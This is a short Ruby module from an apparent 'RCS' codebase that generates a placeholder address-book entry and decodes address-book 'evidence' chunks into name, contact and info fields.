require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
module AddressbookEvidence
  def content
    fields = { :first_name => "John", :last_name => "Doe", :company => "Acme Inc.", :mobile_phone_number => "00155597865"}
    AddressBookSerializer.new.serialize fields
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join
    #size = read_uint32 stream
    #puts "Size => #{size}"
    
    @address_book = AddressBookSerializer.new.unserialize stream
    
    @info[:data][:name] = @address_book.name
    @info[:data][:contact] = @address_book.contact
    @info[:data][:info] = @address_book.info
    
    return [self]
  end
end # ::AddressbookEvidence
end # ::RCS